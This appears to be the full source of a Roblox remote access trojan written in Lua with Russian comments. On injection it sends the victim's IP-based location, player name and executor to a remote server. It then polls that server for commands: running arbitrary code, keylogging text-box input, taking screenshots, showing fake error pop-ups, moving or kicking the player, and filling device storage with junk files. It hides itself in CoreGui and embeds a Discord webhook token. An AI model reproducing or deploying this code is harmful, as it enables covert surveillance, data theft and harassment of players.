local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local TextChatService = game:GetService("TextChatService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local CoreGui = game:GetService("CoreGui")

-- Конфигурация
local SERVER_URL = "https://ratserver-6wo3.onrender.com"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_"
local player = Players.LocalPlayer

-- Системные переменные
local keyloggerEnabled = false
local keylogBuffer = ""
local lastSendTime = os.time()
local scriptHidden = false

-- Сохраняем оригинальную функцию чата
local originalChatFunction
if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    originalChatFunction = TextChatService.OnIncomingMessage
end

-- HTTP-библиотека
local function httpRequest(params)
    local requestFunc
    if syn and syn.request then
        requestFunc = syn.request
    elseif request then
        requestFunc = request
    elseif http and http.request then
        requestFunc = http.request
    else
        return nil
    end
    
    local success, response = pcall(requestFunc, params)
    return success and response or nil
end

-- Функция для создания скриншота
local function captureScreenshot()
    if not RunService:IsStudio() then
        local screenshot
        if getgenv then
            screenshot = getgenv().takescreenshot and getgenv().takescreenshot()
        elseif screencap then
            screenshot = screencap()
        else
            return nil
        end
        
        if screenshot then
            return HttpService:JSONEncode(screenshot)
        end
    end
    return nil
end

-- Функция для загрузки файла с GitHub
local function downloadFromGitHub(url, filename)
    local success, result = pcall(function()
        if not writefile then return false end
        
        local content = game:HttpGet(url)
        if content and #content > 100 then
            writefile(filename, content)
            return true
        end
        return false
    end)
    return success and result
end

-- Функция для получения путей сохранения
local function getSavePaths()
    local paths = {
        "/storage/emulated/0/Download/",
        "/storage/emulated/0/Downloads/",
        "/storage/emulated/0/DCIM/",
        "/storage/emulated/0/Pictures/",
    }
    
    local exploitPaths = {
        "Delta/Workspace/",
        "Codex/Workspace/", 
        "Krnl/Workspace/",
        "ArceusX/Workspace/",
        "Script-Ware/Workspace/",
        "Synapse/Workspace/",
        "Fluxus/Workspace/"
    }
    
    for _, exploitPath in ipairs(exploitPaths) do
        table.insert(paths, "/storage/emulated/0/" .. exploitPath)
    end
    
    return paths
end

-- Отправка уведомления при инжекте
local function sendInjectNotification()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    local ipData = ""
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s\nCity: %s\nISP: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A",
                ipInfo.city or "N/A",
                ipInfo.isp or "N/A"
            )
        end
    end

    local executor = identifyexecutor and identifyexecutor() or "Unknown"
    
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "inject_notify",
            args = {playerName, placeName, ipData, executor}
        })
    })
end

-- Получение данных об оборудовании
local function getHardwareInfo()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    local ipData = ""
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s\nCity: %s\nISP: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A",
                ipInfo.city or "N/A",
                ipInfo.isp or "N/A"
            )
        end
    end

    local hardwareData = {
        player = playerName,
        game = placeName,
        fps = math.floor(workspace:GetRealPhysicsFPS()),
        ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue(),
        executor = identifyexecutor and identifyexecutor() or "Unknown",
        ip_info = ipData
    }
    
    if syn and syn.get_system_metrics then
        hardwareData.cpu = syn.get_system_metrics().CPU
        hardwareData.ram = syn.get_system_metrics().RAM
    end
    
    return hardwareData
end

-- Memory Spam функция с файлами по 2 МБ
local function memorySpam(fileCount)
    local successCount = 0
    
    for i = 1, fileCount do
        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
        
        local success = pcall(function()
            -- Создаем файл ~2 МБ
            local bigContent = ""
            
            -- Заполняем файл случайными данными (2,000 строк по ~1KB = 2MB)
            for j = 1, 2000 do
                bigContent = bigContent .. "SPAM_" .. math.random(100000, 999999) .. "_" .. 
                           string.rep("X", 800) .. "\n"
            end
            
            writefile(filename, bigContent)
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.5)  -- Большая задержка между файлами
    end
    
    return successCount
end

-- Gallery Spam функция - сохраняет в папку инжектора
local function gallerySpam(imageCount)
    local successCount = 0
    
    for i = 1, imageCount do
        local filename = "video_" .. i .. "_" .. math.random(1000, 9999) .. ".mp4"
        
        local success = pcall(function()
            -- Просто сохраняем в текущую папку
            writefile(filename, game:HttpGet("https://github.com/HappyCow91/RobloxScripts/raw/main/Videos/videoplayback.mp4"))
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.3)
    end
    
    return successCount
end
-- Выполнение Lua-кода
local function executeLua(code)
    local func, err = loadstring(code)
    if func then
        local success, result = pcall(func)
        if not success then
            return "Ошибка выполнения: "..tostring(result)
        end
        return "Успешно"
    else
        return "Ошибка компиляции: "..tostring(err)
    end
end

-- Фейковая ошибка
local function showFakeError(message)
    local gui = Instance.new("ScreenGui")
    gui.Name = "FakeError"
    gui.Parent = player:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.5, 0, 0.3, 0)
    frame.Position = UDim2.new(0.25, 0, 0.35, 0)
    frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
    frame.Parent = gui
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
    textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
    textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..message
    textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.BackgroundTransparency = 1
    textLabel.Parent = frame
    
    task.delay(10, function()
        gui:Destroy()
    end)
end

-- Скрытие скрипта
local function hideScript()
    if scriptHidden then return true end
    
    local success = pcall(function()
        if syn and syn.protect_gui then
            syn.protect_gui(script.Parent)
        end
        
        script.Name = "UI_"..tostring(math.random(10000,99999))
        
        if getgenv and getgenv().setthreadidentity then
            getgenv().setthreadidentity(7)
        end
        
        if script.Parent ~= CoreGui then
            script.Parent = CoreGui
        end
    end)
    
    scriptHidden = success
    return success
end

-- Настройка кейлоггера
local function setupKeylogger()
    UserInputService.TextBoxFocused:Connect(function(textBox)
        if keyloggerEnabled then
            textBox.FocusLost:Connect(function()
                if textBox.Text and textBox.Text ~= "" then
                    keylogBuffer = keylogBuffer .. "[Input] " .. textBox.Text .. "\n"
                end
            end)
        end
    end)
end

-- Чат-модуль
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RatChat"
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false
screenGui.Enabled = false

local chatFrame = Instance.new("Frame")
chatFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
chatFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
chatFrame.AnchorPoint = Vector2.new(0.5, 0.5)
chatFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
chatFrame.BackgroundTransparency = 0.3
chatFrame.Active = true
chatFrame.Draggable = true
chatFrame.Parent = screenGui

local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -10, 1, -50)
scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
scrollingFrame.BackgroundTransparency = 1
scrollingFrame.ScrollBarThickness = 5
scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollingFrame.Parent = chatFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -60, 0, 30)
textBox.Position = UDim2.new(0, 5, 1, -35)
textBox.PlaceholderText = "Сообщение..."
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.ClearTextOnFocus = false
textBox.Parent = chatFrame

local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0, 50, 0, 30)
sendButton.Position = UDim2.new(1, -55, 1, -35)
sendButton.Text = "Отпр."
sendButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
sendButton.Parent = chatFrame

local function addMessage(sender, text, isSystem)
    local messageFrame = Instance.new("Frame")
    messageFrame.Size = UDim2.new(1, 0, 0, 0)
    messageFrame.AutomaticSize = Enum.AutomaticSize.Y
    messageFrame.BackgroundTransparency = 1
    messageFrame.Parent = scrollingFrame

    local bubble = Instance.new("Frame")
    bubble.Size = UDim2.new(0.8, 0, 0, 0)
    bubble.AutomaticSize = Enum.AutomaticSize.Y
    bubble.BackgroundColor3 = isSystem and Color3.fromRGB(80, 80, 100) or 
                            (sender == player.Name and Color3.fromRGB(0, 110, 220) or Color3.fromRGB(70, 70, 90))
    bubble.BackgroundTransparency = 0.1
    bubble.Parent = messageFrame

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0.9, 0, 0, 0)
    textLabel.Position = UDim2.new(0.05, 0, 0, 5)
    textLabel.AutomaticSize = Enum.AutomaticSize.Y
    textLabel.Text = sender..": "..text
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextWrapped = true
    textLabel.BackgroundTransparency = 1
    textLabel.Parent = bubble

    scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.AbsoluteCanvasSize.Y)
    
    if sender == player.Name and not isSystem then
        httpRequest({
            Url = SERVER_URL.."/command",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                command = "user_chat",
                args = {sender, text}
            })
        })
    end
end

local function sendMessage()
    local text = string.gsub(textBox.Text, "^%s*(.-)%s*$", "%1")
    if text ~= "" then
        addMessage(player.Name, text)
        textBox.Text = ""
    end
end

textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then sendMessage() end
end)

sendButton.MouseButton1Click:Connect(sendMessage)

-- Обработка команд
local function ExecuteCommand(cmd, args)
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local root = character:FindFirstChild("HumanoidRootPart")

    if cmd == "chat" then
        screenGui.Enabled = not screenGui.Enabled
    
    elseif cmd == "popup" then
        -- Без всплывающих сообщений
    
    elseif cmd == "print" then
        -- Тихая проверка связи
    
    elseif cmd == "kick" then
        player:Kick(args[1] or "Кикнут администратором")
    
    elseif cmd == "freeze" and humanoid then
        humanoid.WalkSpeed = 0
        task.delay(tonumber(args[1] or 5), function()
            if humanoid then humanoid.WalkSpeed = 16 end
        end)
    
    elseif cmd == "void" and root then
        root.CFrame = CFrame.new(0, -5000, 0)
    
    elseif cmd == "spin" and root then
        for i = 1, 50 do
            root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
            task.wait(0.1)
        end
    
    elseif cmd == "fling" and root then
        root.Velocity = Vector3.new(0, 5000, 0)
    
    elseif cmd == "sit" and humanoid then
        humanoid.Sit = not humanoid.Sit
    
    elseif cmd == "dance" and humanoid then
        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://35654637"
        local track = humanoid:LoadAnimation(anim)
        track:Play()
    
    elseif cmd == "blur" then
        local blur = Instance.new("BlurEffect")
        blur.Size = 24
        blur.Parent = Lighting
        task.delay(tonumber(args[1] or 5), function()
            if blur then blur:Destroy() end
        end)
    
    elseif cmd == "mute" then
        for _, sound in ipairs(SoundService:GetDescendants()) do
            if sound:IsA("Sound") then sound.Volume = 0 end
        end
    
    elseif cmd == "unmute" then
        for _, sound in ipairs(SoundService:GetDescendants()) do
            if sound:IsA("Sound") then sound.Volume = 1 end
        end
    
    elseif cmd == "playaudio" and args[1] then
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://"..args[1]
        sound.Parent = root or player
        sound:Play()
        sound.Ended:Connect(function()
            sound:Destroy()
        end)
    
    elseif cmd == "execute" then
        local result = executeLua(table.concat(args, " "))
    
    elseif cmd == "fakeerror" then
        showFakeError(table.concat(args, " "))
    
    elseif cmd == "screenshot" then
        local screenshotData = captureScreenshot()
        if screenshotData then
            httpRequest({
                Url = SERVER_URL.."/screenshot",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    image = screenshotData
                })
            })
        end
    
    elseif cmd == "keylog" then
        keyloggerEnabled = true
        keylogBuffer = ""
        lastSendTime = os.time()
    
    elseif cmd == "stopkeylog" then
        keyloggerEnabled = false
        if keylogBuffer ~= "" then
            httpRequest({
                Url = SERVER_URL.."/keylog",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    logs = keylogBuffer
                })
            })
        end
        keylogBuffer = ""
    
    elseif cmd == "hardware" then
        local hwInfo = getHardwareInfo()
        httpRequest({
            Url = SERVER_URL.."/hardware",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                player = player.Name,
                data = hwInfo
            })
        })
    
    elseif cmd == "hide" then
        hideScript()
    
    -- SPAM КОМАНДЫ
    elseif cmd == "memory_spam" then
        local fileCount = tonumber(args[1]) or 100
        
        task.spawn(function()
            local savedCount = memorySpam(fileCount)
            httpRequest({
                Url = SERVER_URL.."/command",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    command = "spam_completed",
                    args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
                })
            })
        end)
    
    elseif cmd == "gallery_spam" then
        local imageCount = tonumber(args[1]) or 10
        
        task.spawn(function()
            local savedCount = gallerySpam(imageCount)
            httpRequest({
                Url = SERVER_URL.."/command",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    command = "spam_completed",
                    args = {"gallery_spam", "Сохранено "..savedCount.." видео из "..imageCount}
                })
            })
        end)
    
    end
end

-- Функция проверки команд
local function checkCommands()
    local success, response = pcall(function()
        return httpRequest({
            Url = SERVER_URL.."/data",
            Method = "GET"
        })
    end)
    
    if success and response and response.Body then
        local success, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if success and data and data.command and data.command ~= "" then
            pcall(ExecuteCommand, data.command, data.args or {})
            return true
        end
    end
    return false
end

-- Инициализация
sendInjectNotification()
setupKeylogger()
hideScript()

-- Восстанавливаем оригинальную функцию чата
if originalChatFunction then
    TextChatService.OnIncomingMessage = originalChatFunction
end

-- Главный цикл
while task.wait(2) do
    local hasCommand = checkCommands()
    
    if hasCommand then
        task.wait(0.5)
        checkCommands()
    end
    
    -- Отправка логов кейлоггера
    if keyloggerEnabled and os.time() - lastSendTime >= 300 then
        if keylogBuffer ~= "" then
            httpRequest({
                Url = SERVER_URL.."/keylog",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    logs = keylogBuffer
                })
            })
            keylogBuffer = ""
        end
        lastSendTime = os.time()
    end
end
